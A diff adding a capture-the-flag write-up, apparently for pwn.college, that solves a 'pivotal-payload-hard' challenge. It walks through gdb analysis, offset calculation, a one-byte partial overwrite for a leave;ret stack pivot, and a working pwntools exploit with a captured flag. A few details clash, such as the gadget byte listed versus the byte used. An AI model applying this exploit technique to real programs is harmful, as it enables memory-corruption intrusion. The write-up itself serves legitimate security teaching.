@@ -9792,7 +9792,7 @@ pwndbg> x/gx 0x7ffe74b2f678
 
 We can see that the address of the `leave ; ret gadget` in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x5f\x47` vs `\x5f\x36`). Where the address of the gadget in `challenge()` only differs in the four least significant nibbles as compared to the value of the stored return pointer (`\x5e\x8f` vs `\x5f\x36`).
 
-So, if we use the `leave ; ret` gadget present in main() we will only have to overwrite the two least significant nibbles, which we can do deterministically.
+So, if we use the `leave ; ret` gadget present in `main()` we will only have to overwrite the two least significant nibbles, which we can do deterministically.
 
 This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).
 
@@ -10405,3 +10405,295 @@ $
 ```
 
 &nbsp;
+
+## Pivotal Payload (Hard)
+
+```
+hacker@return-oriented-programming~pivotal-payload-hard:~$ /challenge/pivotal-payload-hard 
+###
+### Welcome to /challenge/pivotal-payload-hard!
+###
+
+[LEAK] Your input buffer is located at: 0x7ffcf3f46b38.
+
+```
+
+Requirements for crafting a successful exploit:
+
+- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of the overwritten stored base pointer value from the buffer
+
+### Binary Analysis
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# ---- snip ----
+
+   0x0000000000002023 <+535>:   mov    QWORD PTR [rbp-0x30],0x0
+   0x000000000000202b <+543>:   mov    QWORD PTR [rbp-0x28],0x0
+   0x0000000000002033 <+551>:   mov    QWORD PTR [rbp-0x20],0x0
+   0x000000000000203b <+559>:   mov    QWORD PTR [rbp-0x18],0x0
+   0x0000000000002043 <+567>:   lea    rax,[rbp-0x30]
+   0x0000000000002047 <+571>:   add    rax,0x8
+   0x000000000000204b <+575>:   mov    rsi,rax
+   0x000000000000204e <+578>:   lea    rdi,[rip+0xfb3]        # 0x3008
+   0x0000000000002055 <+585>:   mov    eax,0x0
+   0x000000000000205a <+590>:   call   0x1100 <printf@plt>
+   0x000000000000205f <+595>:   mov    r9d,0x0
+   0x0000000000002065 <+601>:   mov    r8d,0x0
+   0x000000000000206b <+607>:   mov    ecx,0x22
+   0x0000000000002070 <+612>:   mov    edx,0x3
+   0x0000000000002075 <+617>:   mov    esi,0x138
+   0x000000000000207a <+622>:   mov    edi,0x0
+   0x000000000000207f <+627>:   call   0x10f0 <mmap@plt>
+   0x0000000000002084 <+632>:   mov    QWORD PTR [rbp-0x30],rax
+   0x0000000000002088 <+636>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x000000000000208c <+640>:   mov    edx,0x138
+   0x0000000000002091 <+645>:   lea    rsi,[rip+0xfa0]        # 0x3038
+   0x0000000000002098 <+652>:   mov    rdi,rax
+   0x000000000000209b <+655>:   call   0x1130 <memcpy@plt>
+   0x00000000000020a0 <+660>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x00000000000020a4 <+664>:   mov    edx,0x5
+   0x00000000000020a9 <+669>:   mov    esi,0x138
+   0x00000000000020ae <+674>:   mov    rdi,rax
+   0x00000000000020b1 <+677>:   call   0x1150 <mprotect@plt>
+   0x00000000000020b6 <+682>:   test   eax,eax
+   0x00000000000020b8 <+684>:   je     0x20d9 <challenge+717>
+   0x00000000000020ba <+686>:   lea    rcx,[rip+0x1037]        # 0x30f8 <__PRETTY_FUNCTION__.5687>
+   0x00000000000020c1 <+693>:   mov    edx,0x2b
+   0x00000000000020c6 <+698>:   lea    rsi,[rip+0xfba]        # 0x3087
+   0x00000000000020cd <+705>:   lea    rdi,[rip+0xfbc]        # 0x3090
+   0x00000000000020d4 <+712>:   call   0x1110 <__assert_fail@plt>
+   0x00000000000020d9 <+717>:   lea    rax,[rbp-0x30]
+   0x00000000000020dd <+721>:   add    rax,0x8
+   0x00000000000020e1 <+725>:   mov    edx,0x1000
+   0x00000000000020e6 <+730>:   mov    rsi,rax
+   0x00000000000020e9 <+733>:   mov    edi,0x0
+   0x00000000000020ee <+738>:   call   0x1120 <read@plt>
+   0x00000000000020f3 <+743>:   mov    DWORD PTR [rbp-0x4],eax
+   0x00000000000020f6 <+746>:   lea    rdi,[rip+0xfcc]        # 0x30c9
+   0x00000000000020fd <+753>:   call   0x10e0 <puts@plt>
+
+# ---- snip ----
+
+   0x0000000000002303 <+1271>:  leave
+   0x0000000000002304 <+1272>:  ret
+End of assembler dump.
+```
+
+Let us set a breakpoint at `challenge+214` where the call to `read()` is made.
+
+```
+pwndbg> break *(challenge+738)
+Breakpoint 1 at 0x20ee
+```
+
+```
+pwndbg> run
+Starting program: /challenge/pivotal-payload-hard 
+###
+### Welcome to /challenge/pivotal-payload-hard!
+###
+
+[LEAK] Your input buffer is located at: 0x7ffcacefda58.
+
+
+Breakpoint 1, 0x00005979620690ee in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
+ RAX  0x7ffcacefda58 ◂— 0
+ RBX  0x5979620693c0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7f3fc3dc5bcb (mprotect+11) ◂— cmp rax, -0xfff
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffcacefda58 ◂— 0
+ R8   8
+ R9   0x7f3fc3edb020 ◂— xor qword ptr [rsp], rax
+ R10  0x22
+ R11  0x287
+ R12  0x597962068160 (_start) ◂— endbr64 
+ R13  0x7ffcacefdba0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffcacefda80 —▸ 0x7ffcacefdab0 ◂— 0
+ RSP  0x7ffcacefda30 ◂— 0
+ RIP  0x5979620690ee (challenge+738) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
+ ► 0x5979620690ee <challenge+738>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7ffcacefda58 ◂— 0
+        nbytes: 0x1000
+ 
+   0x5979620690f3 <challenge+743>    mov    dword ptr [rbp - 4], eax
+   0x5979620690f6 <challenge+746>    lea    rdi, [rip + 0xfcc]           RDI => 0x59796206a0c9 ◂— 'Leaving!'
+   0x5979620690fd <challenge+753>    call   puts@plt                    <puts@plt>
+ 
+   0x597962069102 <challenge+758>    nop    
+   0x597962069103 <challenge+759>    nop    
+   0x597962069104 <challenge+760>    nop    
+   0x597962069105 <challenge+761>    nop    
+   0x597962069106 <challenge+762>    nop    
+   0x597962069107 <challenge+763>    nop    
+   0x597962069108 <challenge+764>    nop    
+───────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffcacefda30 ◂— 0
+01:0008│-048     0x7ffcacefda38 —▸ 0x7ffcacefdbb8 —▸ 0x7ffcaceff67e ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-040     0x7ffcacefda40 —▸ 0x7ffcacefdba8 —▸ 0x7ffcaceff65e ◂— '/challenge/pivotal-payload-hard'
+03:0018│-038     0x7ffcacefda48 ◂— 0x1c3d3b53d
+04:0020│-030     0x7ffcacefda50 —▸ 0x7f3fc3edb000 ◂— push rbp
+05:0028│ rax rsi 0x7ffcacefda58 ◂— 0
+... ↓            2 skipped
+─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5979620690ee challenge+738
+   1   0x5979620693aa main+165
+   2   0x7f3fc3cd1083 __libc_start_main+243
+   3   0x59796206818e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
+   - Location of the buffer: `0x7ffcacefda58`
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of the overwritten stored base pointer value from the buffer
+
+Let's get the location of the stored return pointer, and calculate the offset.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffcacefda90:
+ rip = 0x5979620690ee in challenge; saved rip = 0x5979620693aa
+ called by frame at 0x7ffcacefdac0
+ Arglist at 0x7ffcacefda80, args: 
+ Locals at 0x7ffcacefda80, Previous frame's sp is 0x7ffcacefda90
+ Saved registers:
+  rbp at 0x7ffcacefda80, rip at 0x7ffcacefda88
+```
+
+```
+pwndbg> p/d 0x7ffcacefda88 - 0x7ffcacefda58
+$1 = 48
+```
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
+   - Location of the buffer: `0x7ffcacefda58`
+   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of the overwritten stored base pointer value from the buffer
+
+#### ROP gadgets
+
+The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different safe the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.
+
+We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.
+
+We know that the `leave ; ret` instructions are at the epilogue of every function. We also know where this gadget is in the `challenge()` function:
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# ---- snip ----
+
+   0x0000597962069303 <+1271>:  leave
+   0x0000597962069304 <+1272>:  ret
+End of assembler dump.
+```
+
+Let's find the address of the same gadget in `main()`.
+
+```
+pwndbg> disassemble main
+Dump of assembler code for function main:
+
+# ---- snip ----
+
+   0x00005979620693bb <+182>:   leave
+   0x00005979620693bc <+183>:   ret
+End of assembler dump.
+```
+
+Finally, since we want to overwrite the stored return pointer, let's check it's value as well.
+
+```
+pwndbg> x/gx 0x7ffcacefda88
+0x7ffcacefda88: 0x00005979620693aa
+```
+
+We can see that the address of the `leave ; ret gadget` in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x93\xbb` vs `\x93\xaa`) and the gadget in `challenge()` also only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x93\x03` vs `\x93\xaa`).
+
+Which means that regardless of whichever of the two functions we take the `leave ; ret` gadget from, we will only have to overwrite the two least significant nibbles, which we can do deterministically.
+
+This is because the address are always `0x1000` aligned. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).
+
+We have the following information now:
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
+   - Location of the buffer: `0x7ffcacefda58`
+   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
+- [x] Locations of required ROP gadgets
+   - `leave ; ret`: `\xbb`
+- [ ] Offset of the overwritten stored base pointer value from the buffer
+
+Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
+   - Location of the buffer: `0x7ffcacefda58`
+   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
+- [x] Locations of required ROP gadgets
+   - `leave ; ret`: `\xbb`
+- [x] Offset of the overwritten stored base pointer value from the buffer: `-16`
+
+### ROP chain: Stack pivot + ret2win
+
+The ROP chain would be the exact same as the [easy challenge](#rop-chain-stack-pivot--ret2win-2).
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+context.arch = 'amd64'
+
+# ROP gadgets
+leave_lsb = b"\x03"
+# Memory addresses and offsets
+rip_offset = 48
+rbp_offset = rip_offset - 8
+
+p = process('/challenge/pivotal-payload-hard')
+
+# Parse leaks
+p.recvuntil(b"buffer is located at: ")
+buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)
+
+# Pivot logic
+# win_ptr is at leak-8. 
+# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
+target_rbp = buffer_addr - 16
+
+# Stable 1-byte pivot payload
+payload = flat(
+    b"A" * rbp_offset,
+    target_rbp,
+    leave_lsb
+)
+
+p.send(payload)
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~pivotal-payload-hard:~$ python ~/script.py
+[+] Starting local process '/challenge/pivotal-payload-hard': pid 3809
+[*] Switching to interactive mode
+
+[*] Process '/challenge/pivotal-payload-hard' stopped with exit code -11 (SIGSEGV) (pid 3809)
+Leaving!
+pwn.college{onOkY1aJNYYk8b7iKLUDh38_3K3.0lM2MDL4ITM0EzW}
+[*] Got EOF while reading in interactive
+$
+```
